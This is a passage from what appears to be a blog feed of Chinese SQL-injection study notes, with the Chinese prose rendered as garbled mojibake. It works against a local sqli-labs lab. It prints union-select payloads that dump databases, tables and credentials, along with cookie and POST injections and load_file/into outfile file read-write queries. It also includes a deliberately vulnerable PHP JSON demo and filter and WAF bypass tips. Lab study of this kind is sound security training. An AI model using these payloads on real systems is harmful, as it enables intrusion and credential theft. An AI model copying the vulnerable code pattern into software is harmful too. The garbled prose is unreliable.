å†™æ³•ï¼Œå¦‚æœå¯¹æ–¹é‡‡ç”¨REQUESTæ¥æ”¶æ–¹å¼ï¼Œå°±ä¸éœ€è¦è€ƒè™‘ç”¨ä½•ç§æ–¹æ³•å»æäº¤ï¼Œå› ä¸ºç”¨GETã€POSTéƒ½å¯ä»¥ã€‚å¦‚æœå¯¹æ–¹æ˜¯å•ä¸€æ¥æ”¶æ–¹å¼ï¼Œé‚£ä¹ˆåœ¨æ³¨å…¥çš„æ—¶å€™éœ€è¦ç”¨å®ƒçš„æ–¹æ³•å»æ³¨å…¥ã€‚</p><h4 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h4><p>$_SERVERæ˜¯PHPé‡Œå†…ç½®å˜é‡ï¼Œå…¨å±€å˜é‡ï¼ŒPHPå†™è„šæœ¬æ—¶ç”¨å®ƒæ¥è·å–ç³»ç»Ÿçš„å€¼ï¼Œåœ¨æ•°æ®åŒ…çš„æŸä¸€ä¸ªåœ°æ–¹å¯ä»¥è¿›è¡Œæ³¨å…¥</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104462.png" alt="image-20210826174348974"></p><h3 id="JSONæ³¨å…¥ç›¸å…³çŸ¥è¯†"><a href="#JSONæ³¨å…¥ç›¸å…³çŸ¥è¯†" class="headerlink" title="JSONæ³¨å…¥ç›¸å…³çŸ¥è¯†"></a>JSONæ³¨å…¥ç›¸å…³çŸ¥è¯†</h3><h4 id="JSONåŸºç¡€"><a href="#JSONåŸºç¡€" class="headerlink" title="JSONåŸºç¡€"></a>JSONåŸºç¡€</h4><p>ç®€ä»‹</p><p>JSON æ˜¯å­˜å‚¨å’Œäº¤æ¢æ–‡æœ¬ä¿¡æ¯çš„è¯­æ³•ï¼Œæ˜¯è½»é‡çº§çš„æ–‡æœ¬æ•°æ®äº¤æ¢æ ¼å¼ã€‚ç±»ä¼¼xmlï¼Œä½†JSON æ¯” XML æ›´å°ã€æ›´å¿«ï¼Œæ›´æ˜“è§£æã€‚æ‰€ä»¥ç°åœ¨æ¥å£æ•°æ®ä¼ è¾“éƒ½é‡‡ç”¨jsonæ–¹å¼è¿›è¡Œã€‚JSON æ–‡æœ¬çš„ MIME ç±»å‹æ˜¯ â€œapplication/jsonâ€</p><p>JSONè¯­æ³•</p><ul><li>æ•°æ®åœ¨åç§°/å€¼å¯¹ä¸­</li><li>æ•°æ®ç”±é€—å·åˆ†éš”</li><li>å¤§æ‹¬å·ä¿å­˜å¯¹è±¡</li><li>ä¸­æ‹¬å·ä¿å­˜æ•°ç»„</li></ul><p>JSONå€¼</p><ul><li>æ•°å­—ï¼ˆæ•´æ•°æˆ–æµ®ç‚¹æ•°ï¼‰ {â€œageâ€:30 }</li><li>å­—ç¬¦ä¸²ï¼ˆåœ¨åŒå¼•å·ä¸­ï¼‰ {â€œunameâ€:â€yangâ€}</li><li>é€»è¾‘å€¼ï¼ˆtrue æˆ– falseï¼‰ {â€œflagâ€:true }</li><li>æ•°ç»„ï¼ˆåœ¨ä¸­æ‹¬å·ä¸­ï¼‰{â€œsitesâ€:[{â€œnameâ€:â€yangâ€},{â€œnameâ€:â€mingâ€}]}</li><li>å¯¹è±¡ï¼ˆåœ¨å¤§æ‹¬å·ä¸­ï¼‰JSON å¯¹è±¡åœ¨å¤§æ‹¬å·ï¼ˆ{}ï¼‰ä¸­ä¹¦å†™ï¼š</li><li>null  { â€œrunoobâ€:null }</li></ul><p>JSONä»£ç æ ¼å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;users&quot;: &#123;</span><br><span class="line">    &quot;user&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;id&quot;: &quot;1&quot;,</span><br><span class="line">        &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">        &quot;passwd&quot;: &quot;admin888&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;id&quot;: &quot;2&quot;,</span><br><span class="line">        &quot;username&quot;: &quot;root&quot;,</span><br><span class="line">        &quot;passwd&quot;: &quot;root123&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;id&quot;: &quot;3&quot;,</span><br><span class="line">        &quot;username&quot;: &quot;system&quot;,</span><br><span class="line">        &quot;passwd&quot;: &quot;system456&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="JSONæ³¨å…¥"><a href="#JSONæ³¨å…¥" class="headerlink" title="JSONæ³¨å…¥"></a>JSONæ³¨å…¥</h4><p>JSONæ³¨å…¥æ˜¯æŒ‡åº”ç”¨ç¨‹åºæ‰€è§£æçš„JSONæ•°æ®æ¥æºäºä¸å¯ä¿¡èµ–çš„æ•°æ®æºï¼Œç¨‹åºæ²¡æœ‰å¯¹è¿™äº›ä¸å¯ä¿¡èµ–çš„æ•°æ®è¿›è¡ŒéªŒè¯ã€è¿‡æ»¤ï¼Œå¦‚æœåº”ç”¨ç¨‹åºä½¿ç”¨æœªç»éªŒè¯çš„è¾“å…¥æ„é€  JSONï¼Œåˆ™å¯ä»¥æ›´æ”¹ JSON æ•°æ®çš„è¯­ä¹‰ã€‚åœ¨ç›¸å¯¹ç†æƒ³çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ’å…¥æ— å…³çš„å…ƒç´ ï¼Œå¯¼è‡´åº”ç”¨ç¨‹åºåœ¨è§£æ JSONæ•°æ®æ—¶æŠ›å‡ºå¼‚å¸¸ã€‚</p><h3 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h3><h4 id="å‚æ•°å­—ç¬¦å‹æ³¨å…¥æµ‹è¯•"><a href="#å‚æ•°å­—ç¬¦å‹æ³¨å…¥æµ‹è¯•" class="headerlink" title="å‚æ•°å­—ç¬¦å‹æ³¨å…¥æµ‹è¯•"></a>å‚æ•°å­—ç¬¦å‹æ³¨å…¥æµ‹è¯•</h4><h5 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h5><p>å•å¼•å·é—­åˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=3&#x27; order by 3 --+</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104487.png" alt="image-20210826200648215"></p><h5 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h5><p>åŒå¼•å·é—­åˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-6/?id=3&quot; and 1=1--+</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104559.png" alt="image-20210826200804673"></p><h4 id="POST-æ•°æ®æäº¤æ³¨å…¥æµ‹è¯•"><a href="#POST-æ•°æ®æäº¤æ³¨å…¥æµ‹è¯•" class="headerlink" title="POST æ•°æ®æäº¤æ³¨å…¥æµ‹è¯•"></a>POST æ•°æ®æäº¤æ³¨å…¥æµ‹è¯•</h4><h5 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and 1=2 #&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104563.png" alt="image-20210826201256873"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and 1=1 #&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104014.png" alt="image-20210826201313639"></p><p>ï‚² å‚æ•° JSON æ•°æ®æ³¨å…¥æµ‹è¯•=&gt;æœ¬åœ°ç¯å¢ƒä»£ç æ¼”ç¤º</p><h4 id="COOKIE-æ•°æ®æäº¤æ³¨å…¥æµ‹è¯•"><a href="#COOKIE-æ•°æ®æäº¤æ³¨å…¥æµ‹è¯•" class="headerlink" title="COOKIE æ•°æ®æäº¤æ³¨å…¥æµ‹è¯•"></a>COOKIE æ•°æ®æäº¤æ³¨å…¥æµ‹è¯•</h4><p>éœ€è¦å…ˆç™»å½•ï¼Œç„¶åè¿›è¡Œcookieæ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /sqli/Less-20/index.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://127.0.0.1/sqli/Less-20/</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: uname=admi&#x27; union select 1,database(),3#; csrftoken=vKkecYAHNQy0hBzIqkW7oaJw91c8w1DPtQhCAWIXKPPgjuxTF3uii1r7lXPlDHeL</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104602.png" alt="image-20210826203427162"></p><h4 id="HTTP-å¤´éƒ¨å‚æ•°æ•°æ®æ³¨å…¥æµ‹è¯•"><a href="#HTTP-å¤´éƒ¨å‚æ•°æ•°æ®æ³¨å…¥æµ‹è¯•" class="headerlink" title="HTTP å¤´éƒ¨å‚æ•°æ•°æ®æ³¨å…¥æµ‹è¯•"></a>HTTP å¤´éƒ¨å‚æ•°æ•°æ®æ³¨å…¥æµ‹è¯•</h4><p>UAå¤´æ³¨å…¥</p><p>é—­åˆæ‰å‰é¢çš„ï¼Œä½¿ç”¨æŠ¥é”™æ³¨å…¥</p><h4 id="é…åˆ-sqlilabs-æœ¬åœ°æ•°æ®åº“æ¼”ç¤º"><a href="#é…åˆ-sqlilabs-æœ¬åœ°æ•°æ®åº“æ¼”ç¤º" class="headerlink" title="é…åˆ sqlilabs æœ¬åœ°æ•°æ®åº“æ¼”ç¤º"></a>é…åˆ sqlilabs æœ¬åœ°æ•°æ®åº“æ¼”ç¤º</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">if(isset($_POST[&#x27;json&#x27;]))&#123;</span><br><span class="line">$json_str=$_POST[&#x27;json&#x27;];</span><br><span class="line">$json=json_decode($json_str);</span><br><span class="line">if(!$json)&#123;</span><br><span class="line">die(&#x27;JSON æ–‡æ¡£æ ¼å¼æœ‰è¯¯ï¼Œè¯·æ£€æŸ¥&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">$username=$json-&gt;username;</span><br><span class="line">//$passwd=$json-&gt;passwd;</span><br><span class="line">$mysqli=new mysqli();</span><br><span class="line">$mysqli-&gt;connect(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;);</span><br><span class="line">if($mysqli-&gt;connect_errno)&#123;</span><br><span class="line">die(&#x27;æ•°æ®åº“è¿æ¥å¤±è´¥ï¼š&#x27;.$mysqli-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line">$mysqli-&gt;select_db(&#x27;security&#x27;);</span><br><span class="line">if($mysqli-&gt;errno)&#123;</span><br><span class="line">dir(&#x27;æ‰“å¼€æ•°æ®åº“å¤±è´¥ï¼š&#x27;.$mysqli-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line">$mysqli-&gt;set_charset(&#x27;utf-8&#x27;);</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE username=&#x27;&#123;$username&#125;&#x27;&quot;;</span><br><span class="line">echo $sql;</span><br><span class="line">$result=$mysqli-&gt;query($sql);</span><br><span class="line">if(!$result)&#123;</span><br><span class="line">die(&#x27;æ‰§è¡Œ SQL è¯­å¥å¤±è´¥ï¼š&#x27;.$mysqli-&gt;error);</span><br><span class="line">&#125;else if($result-&gt;num_rows==0)&#123;</span><br><span class="line">die(&#x27;æŸ¥è¯¢ç»“æœä¸ºç©º&#x27;);</span><br><span class="line">&#125;else &#123;</span><br><span class="line">$array1=$result-&gt;fetch_all(MYSQLI_ASSOC);</span><br><span class="line">echo &quot;ç”¨æˆ·åï¼š&#123;$array1[0][&#x27;username&#x27;]&#125;,å¯†ç ï¼š&#123;$array1[0][&#x27;password&#x27;]&#125;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$result-&gt;free();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>13WEBæ¼æ´--SQLæ³¨å…¥ä¹‹MYSQLæ³¨å…¥</title>
      <link href="/2021/09/21/13WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/09/21/13WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>MYSQL æ³¨å…¥ä¸­é¦–å…ˆè¦æ˜ç¡®å½“å‰æ³¨å…¥ç‚¹æƒé™ï¼Œé«˜æƒé™æ³¨å…¥æ—¶æœ‰æ›´å¤šçš„æ”»å‡»æ‰‹æ³•ï¼Œæœ‰çš„èƒ½ç›´æ¥è¿›è¡Œ getshell æ“ä½œã€‚å…¶ä¸­ä¹Ÿä¼šé‡åˆ°å¾ˆå¤šé˜»ç¢ï¼Œç›¸å…³é˜²å¾¡æ–¹æ¡ˆä¹Ÿè¦æ˜ç¡®ï¼Œæ‰€è°“çŸ¥å·±çŸ¥å½¼,ç™¾æˆ˜ä¸æ®†ã€‚ä¸è®ºä½œä¸ºæ”»å‡»è¿˜æ˜¯é˜²å¾¡éƒ½éœ€è¦äº†è§£å…¶ä¸­çš„æ‰‹æ³•å’ŒåŸç†ï¼Œè¿™æ ·æ‰æ˜¯ä¸€ä¸ªåˆæ ¼çš„å®‰å…¨å·¥ä½œè€…ã€‚</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103519.png" alt="image-20210825194532989" style="zoom:80%;" /><h3 id="é«˜æƒé™æ³¨å…¥"><a href="#é«˜æƒé™æ³¨å…¥" class="headerlink" title="é«˜æƒé™æ³¨å…¥"></a>é«˜æƒé™æ³¨å…¥</h3><h4 id="æ£€æŸ¥æƒé™"><a href="#æ£€æŸ¥æƒé™" class="headerlink" title="æ£€æŸ¥æƒé™"></a>æ£€æŸ¥æƒé™</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,user(),3</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯rootåˆ™ä¸ºé«˜æƒé™ï¼Œé«˜æƒé™ç”¨æˆ·å¯ä»¥è·¨åº“æ³¨å…¥ï¼Œæ™®é€šç”¨æˆ·åªèƒ½æ³¨å…¥è‡ªå·±çš„æ•°æ®åº“ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103522.png" alt="image-20210825195241184"></p><p>æƒé™åœ¨è¿™é‡Œè®¾ç½®</p><h3 id="è·¨åº“æŸ¥è¯¢åŠåº”ç”¨æ€è·¯"><a href="#è·¨åº“æŸ¥è¯¢åŠåº”ç”¨æ€è·¯" class="headerlink" title="è·¨åº“æŸ¥è¯¢åŠåº”ç”¨æ€è·¯"></a>è·¨åº“æŸ¥è¯¢åŠåº”ç”¨æ€è·¯</h3><p>information_schema è¡¨ç‰¹æ€§ï¼Œè®°å½•åº“åï¼Œè¡¨åï¼Œåˆ—åå¯¹åº”è¡¨</p><h4 id="è·å–æ‰€æœ‰æ•°æ®åº“åï¼š"><a href="#è·å–æ‰€æœ‰æ•°æ®åº“åï¼š" class="headerlink" title="è·å–æ‰€æœ‰æ•°æ®åº“åï¼š"></a>è·å–æ‰€æœ‰æ•°æ®åº“åï¼š</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata --+</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103116.png" alt="image-20210825200634317"></p><h4 id="è·å–æŒ‡å®š-pikachuæ•°æ®åº“åä¸‹çš„è¡¨åä¿¡æ¯ï¼š"><a href="#è·å–æŒ‡å®š-pikachuæ•°æ®åº“åä¸‹çš„è¡¨åä¿¡æ¯ï¼š" class="headerlink" title="è·å–æŒ‡å®š pikachuæ•°æ®åº“åä¸‹çš„è¡¨åä¿¡æ¯ï¼š"></a>è·å–æŒ‡å®š pikachuæ•°æ®åº“åä¸‹çš„è¡¨åä¿¡æ¯ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-2/?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;pikachu&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103868.png" alt="image-20210825201033697"></p><h4 id="è·å–æŒ‡å®špikachuä¸‹çš„è¡¨å-users-ä¸‹çš„åˆ—åä¿¡æ¯ï¼š"><a href="#è·å–æŒ‡å®špikachuä¸‹çš„è¡¨å-users-ä¸‹çš„åˆ—åä¿¡æ¯ï¼š" class="headerlink" title="è·å–æŒ‡å®špikachuä¸‹çš„è¡¨å users ä¸‹çš„åˆ—åä¿¡æ¯ï¼š"></a>è·å–æŒ‡å®špikachuä¸‹çš„è¡¨å users ä¸‹çš„åˆ—åä¿¡æ¯ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;pikachu&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103705.png" alt="image-20210825201433321"></p><h4 id="è·å–æŒ‡å®š-pikachuä¸‹çš„-users-æ•°æ®"><a href="#è·å–æŒ‡å®š-pikachuä¸‹çš„-users-æ•°æ®" class="headerlink" title="è·å–æŒ‡å®š pikachuä¸‹çš„ users æ•°æ®"></a>è·å–æŒ‡å®š pikachuä¸‹çš„ users æ•°æ®</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-2/?id=-1 union select 1,group_concat(concat_ws(0x7e,username,password)),3 from pikachu.users--+</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103871.png" alt="image-20210825201558670"></p><h3 id="æ–‡ä»¶è¯»å†™æ“ä½œ"><a href="#æ–‡ä»¶è¯»å†™æ“ä½œ" class="headerlink" title="æ–‡ä»¶è¯»å†™æ“ä½œ"></a>æ–‡ä»¶è¯»å†™æ“ä½œ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">load_file()ï¼šè¯»å–å‡½æ•°</span><br><span class="line">into outfile æˆ– into dumpfile ï¼šå¯¼å‡ºå‡½æ•°</span><br><span class="line"></span><br><span class="line">select load_file(&#x27;D:\\phpStudy\\WWW\\sqli\\Less-7\\test.txt&#x27;);</span><br><span class="line">select &#x27;crow&#x27; into outfile &#x27;D:\\phpStudy\\WWW\\sqli\\Less-7\\test.txt&#x27;; å†™å…¥å†…å®¹ä¸ºcrow</span><br></pre></td></tr></table></figure><h3 id="è·¯å¾„è·å–å¸¸è§æ–¹æ³•ï¼š"><a href="#è·¯å¾„è·å–å¸¸è§æ–¹æ³•ï¼š" class="headerlink" title="è·¯å¾„è·å–å¸¸è§æ–¹æ³•ï¼š"></a>è·¯å¾„è·å–å¸¸è§æ–¹æ³•ï¼š</h3><p>æŠ¥é”™æ˜¾ç¤ºï¼Œé—ç•™æ–‡ä»¶ï¼Œæ¼æ´æŠ¥é”™ï¼Œå¹³å°é…ç½®æ–‡ä»¶ï¼Œçˆ†ç ´ç­‰</p><h4 id="windowsä¸€èˆ¬è·¯å¾„"><a href="#windowsä¸€èˆ¬è·¯å¾„" class="headerlink" title="windowsä¸€èˆ¬è·¯å¾„:"></a>windowsä¸€èˆ¬è·¯å¾„:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d:/wwwroot/xiaodi8/</span><br></pre></td></tr></table></figure><h4 id="linuxä¸€èˆ¬è·¯å¾„"><a href="#linuxä¸€èˆ¬è·¯å¾„" class="headerlink" title="linuxä¸€èˆ¬è·¯å¾„:"></a>linuxä¸€èˆ¬è·¯å¾„:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/xiaodi8</span><br></pre></td></tr></table></figure><h3 id="å¸¸è§è¯»å–æ–‡ä»¶åˆ—è¡¨ï¼š"><a href="#å¸¸è§è¯»å–æ–‡ä»¶åˆ—è¡¨ï¼š" class="headerlink" title="å¸¸è§è¯»å–æ–‡ä»¶åˆ—è¡¨ï¼š"></a>å¸¸è§è¯»å–æ–‡ä»¶åˆ—è¡¨ï¼š</h3><p>å¸¸è§å†™å…¥æ–‡ä»¶é—®é¢˜ï¼šé­”æœ¯å¼•å·å¼€å…³</p><p>magic_quotes_gpcå‡½æ•°åœ¨phpä¸­çš„ä½œç”¨æ˜¯åˆ¤æ–­è§£æç”¨æˆ·æç¤ºçš„æ•°æ®ï¼Œå¦‚åŒ…æ‹¬æœ‰:postã€getã€cookieè¿‡æ¥çš„æ•°æ®å¢åŠ è½¬ä¹‰å­—ç¬¦â€œ\â€ï¼Œä»¥ç¡®ä¿è¿™äº›æ•°æ®ä¸ä¼šå¼•èµ·ç¨‹åºï¼Œç‰¹åˆ«æ˜¯æ•°æ®åº“è¯­å¥å› ä¸ºç‰¹æ®Šå­—ç¬¦å¼•èµ·çš„æ±¡æŸ“è€Œå‡ºç°è‡´å‘½çš„é”™è¯¯ã€‚</p><p>åœ¨magic_quotes_gpc=Onçš„æƒ…å†µä¸‹ï¼Œå¦‚æœè¾“å…¥çš„æ•°æ®æœ‰å•å¼•å·ï¼ˆâ€™ï¼‰ã€åŒå¼•å·ï¼ˆâ€ï¼‰ã€åæ–œçº¿ï¼ˆï¼‰ä¸ NULï¼ˆNULL å­—ç¬¦ï¼‰ç­‰å­—ç¬¦éƒ½ä¼šè¢«åŠ ä¸Šåæ–œçº¿ã€‚è¿™äº›è½¬ä¹‰æ˜¯å¿…é¡»çš„ï¼Œå¦‚æœè¿™ä¸ªé€‰é¡¹ä¸ºoffï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¿…é¡»è°ƒç”¨addslashesè¿™ä¸ªå‡½æ•°æ¥ä¸ºå­—ç¬¦ä¸²å¢åŠ è½¬ä¹‰ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magic_quotes_gpc</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103378.png" alt="image-20210825203715912"></p><h4 id="é­”æœ¯å¼•å·åŠå¸¸è§é˜²æŠ¤"><a href="#é­”æœ¯å¼•å·åŠå¸¸è§é˜²æŠ¤" class="headerlink" title="é­”æœ¯å¼•å·åŠå¸¸è§é˜²æŠ¤"></a>é­”æœ¯å¼•å·åŠå¸¸è§é˜²æŠ¤</h4><h4 id="ç¼–ç æˆ–å®½å­—èŠ‚ç»•è¿‡ï¼š"><a href="#ç¼–ç æˆ–å®½å­—èŠ‚ç»•è¿‡ï¼š" class="headerlink" title="ç¼–ç æˆ–å®½å­—èŠ‚ç»•è¿‡ï¼š"></a>ç¼–ç æˆ–å®½å­—èŠ‚ç»•è¿‡ï¼š</h4><p>æ¯”å¦‚åœ¨sqlmapä¸­æ·»åŠ â€“temperè„šæœ¬å‚æ•°è½¬ç æˆ–è€…ä½¿ç”¨è½¬æ¢å·¥å…·</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103565.png" alt="image-20210825203919068" style="zoom:67%;" /><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103340.png" alt="image-20210825203933981"></p><p>addslashes() å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚</p><p>é¢„å®šä¹‰å­—ç¬¦æ˜¯ï¼š</p><ul><li>å•å¼•å·ï¼ˆâ€™ï¼‰</li><li>åŒå¼•å·ï¼ˆâ€ï¼‰</li><li>åæ–œæ ï¼ˆ\ï¼‰</li><li>NULL</li></ul><h4 id="é˜²æŠ¤"><a href="#é˜²æŠ¤" class="headerlink" title="é˜²æŠ¤"></a>é˜²æŠ¤</h4><p>è‡ªå¸¦é˜²å¾¡ï¼šé­”æœ¯å¼•å·</p><p>å†…ç½®å‡½æ•°ï¼šintã€addslashes() å‡½æ•°ç­‰</p><p>çº¯æ•°å­—è¿‡æ»¤é¥¶è¿‡ä¸äº†</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104801.png" alt="image-20210825204255831" style="zoom:80%;" /><p>å…³é”®å­—è¿‡æ»¤</p><p>å°†selectæ›¿æ¢ä¸ºfuck,è¿™ç§å¯ä»¥é€šè¿‡å¤§å°å†™ç»•è¿‡ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103377.png" alt="image-20210825204910361"></p><p>WAFé˜²æŠ¤è½¯ä»¶</p><p>å®‰å…¨ç‹—ã€å®å¡”ç­‰</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104599.png" alt="image-20210825205307043" style="zoom:80%;" /><h4 id="ä½ç‰ˆæœ¬æ³¨å…¥é…åˆè¯»å–æˆ–æš´åŠ›"><a href="#ä½ç‰ˆæœ¬æ³¨å…¥é…åˆè¯»å–æˆ–æš´åŠ›" class="headerlink" 